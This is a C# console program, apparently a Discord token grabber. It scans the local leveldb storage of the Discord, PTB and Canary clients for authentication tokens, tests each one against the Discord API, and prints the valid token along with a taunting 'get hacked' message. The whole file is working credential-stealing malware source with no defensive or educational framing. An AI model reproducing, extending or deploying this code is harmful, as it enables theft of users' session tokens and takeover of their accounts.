using RestSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace token
{
    class Program
    {
		private static readonly string tokenFileDirectory = "\\Local Storage\\leveldb";

		private static readonly string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		private static readonly string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		public static readonly string temporaryDirectoryPath = Path.Combine(localAppDataPath, "\\temp");

		public static readonly string discordTokenDirectory = Path.Combine(appDataPath, "Discord" + tokenFileDirectory);

		public static readonly string ptbTokenDirectory = Path.Combine(appDataPath, "discordptb" + tokenFileDirectory);

		public static readonly string canaryTokenDirectory = Path.Combine(appDataPath, "discordcanary" + tokenFileDirectory);

		private static readonly Regex tokenRegex = new Regex("([A-Za-z0-9_\\./\\\\-]*)");

		private static List<string> ReadAllLines(string file)
		{
			List<string> list = new List<string>();
			using (FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
				{
					while (streamReader.Peek() >= 0)
					{
						list.Add(streamReader.ReadLine());
					}
				}
			}
			return list;
		}

		private static string TokenRegexCheck(string line)
		{
			foreach (object obj in tokenRegex.Matches(line))
			{
				string value = ((Match)obj).Groups[0].Value;
				if (value.Length == 59 || value.Length == 88)
				{
					return value;
				}
			}
			return "";
		}

		private static string PerformTokenCheck(string line)
		{
			if (line.Contains("[oken"))
			{
				return TokenRegexCheck(line);
			}
			if (line.Contains(">oken"))
			{
				return TokenRegexCheck(line);
			}
			if (line.Contains("token>"))
			{
				foreach (object obj in tokenRegex.Matches(line))
				{
					Match match = (Match)obj;
					if (match.Length >= 59)
					{
						return match.Value;
					}
				}
			}
			return "";
		}

		public static List<string> RetrieveDiscordTokens()
		{
			List<string> tokens = new List<string>();
			List<string> paths = new List<string>(new string[]
			{
				discordTokenDirectory,
				ptbTokenDirectory,
				canaryTokenDirectory
			});
			List<string> files = new List<string>();
			foreach (string path in paths)
			{
				if (Directory.Exists(path))
				{
					IEnumerable<string> collection = from specifiedFile in Directory.EnumerateFiles(path)
													 where specifiedFile.EndsWith(".ldb") || specifiedFile.EndsWith(".log")
													 select specifiedFile;
					files.AddRange(collection);
				}
			}
			foreach (string file in files)
			{
				foreach (string line in ReadAllLines(file))
				{
					if (!(PerformTokenCheck(line) == ""))
					{
						tokens.Add(PerformTokenCheck(line));
					}
				}
			}
			return tokens;
		}

		static void Main(string[] args)
        {
			string realToken = string.Empty;

			RestClient client = new RestClient("https://discordapp.com/api/v6/users/@me");
			foreach (string token in RetrieveDiscordTokens())
			{
				client.Timeout = -1;
				RestRequest request = new RestRequest(Method.GET);
				request.AddHeader("Authorization", token);
				IRestResponse response = client.Execute(request);
				if (response.StatusCode == System.Net.HttpStatusCode.OK)
					realToken = token;
			}

			Console.WriteLine($"haha noob i have your token lol noob get hacked: \n{realToken}");
			Console.ReadKey();
        }
    }
}
